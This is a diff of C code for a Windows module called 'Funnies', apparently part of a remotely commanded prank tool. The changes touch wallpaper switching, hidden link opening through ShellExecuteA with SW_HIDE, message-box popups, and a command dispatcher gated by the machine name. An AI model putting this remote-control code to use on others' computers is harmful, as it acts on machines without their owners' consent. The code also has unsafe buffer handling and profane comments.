@@ -1,7 +1,7 @@
 #include "Funnies.h"
 #include "Link.h"
 
-const char *PCName;
+char PCName[AUTH_LENGTH];
 static byte wallpaper[MAX_PATH] = BADPATH;
 
 void changeWallpaper(const char *img) {
@@ -10,9 +10,11 @@ void changeWallpaper(const char *img) {
         return;
     }
 
-    char path[CMD_ARGSZ];
-    getcwd(path, CMD_ARGSZ);
-    sprintf(path, "\\res\\%s.png");
+    char cwd[MAX_PATH/2];
+    getcwd(cwd, MAX_PATH/2);
+
+    char path[MAX_PATH];
+    sprintf(path, "%s\\res\\%s.png", cwd, img);
 
     if(!SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE))
         JBlogErr("Could not change wallpaper");
@@ -64,6 +66,7 @@ void openLink(char *site) {
         url[strlen(url)-1] = '\0'; // remove last + added
 
         ShellExecuteA(HWND_BROADCAST, "open", url, NULL, NULL, SW_HIDE);
+        return;
     }
     
     JBlogErr("Incorrect arguments");
@@ -101,16 +104,17 @@ void popupW(char *argz) {
 
     wchar_t wargz[CMD_ARGSZ];
     MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
-    
-#ifndef TELTHAR_STUPID_WIDE_CHAR
-    wchar_t *arg1 = wcstok(wargz, SEPL);
-    wchar_t *arg2 = wcstok(NULL, SEPL);
-#else
+
+    // we're never adding support for wchars ever again
+#ifdef __MINGW64__
+    wchar_t *dummy = NULL;
+    wchar_t *arg1 = wcstok(wargz, SEPL, &dummy);
+    wchar_t *arg2 = wcstok(NULL, SEPL, &dummy);
+#elif defined(TELTHAR_STUPID_WIDE_CHAR)
     /* For later generations */
     
     //wchar_t *arg1 = _wcstok_s_l(wargz, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
     //wchar_t *arg2 = _wcstok_s_l(NULL, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
-
     unsigned char *_arg1 = _mbstok(argz, SEPC);
     unsigned char *_arg2 = _mbstok(NULL, SEPC);
 
@@ -123,6 +127,12 @@ void popupW(char *argz) {
 
     MultiByteToWideChar(CP_UTF8, 0, _arg1, -1, arg1, one);
     MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
+
+    free(arg1); // you didnt even fucking free this shit
+    free(arg2);
+#else
+    wchar_t *arg1 = wcstok(wargz, SEPL);
+    wchar_t *arg2 = wcstok(NULL, SEPL);
 #endif
 
     if(!MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0))
@@ -145,15 +155,17 @@ void popupA(char *argz) {
 void execCommand(JBCMD cmd)
 {
     // If strings are different then fail.
+    //hexdump("cmd.auth", cmd.auth, AUTH_LENGTH, 16);
+    //hexdump("PCName", PCName, AUTH_LENGTH, 16);
     if (strcmp(cmd.auth, PCName)) {
         JBlogErr("Auth failed.");
         return;
     }
 
-    {
-    char msg[32];
-	sprintf(msg, "Executing instruction nr.%d", cmd.cmd);
-    JBlog(msg);
+    { // fake scope
+        char msg[32];
+        sprintf(msg, "Executing instruction nr.%d", cmd.cmd);
+        JBlog(msg);
     }
 
     switch (cmd.cmd)
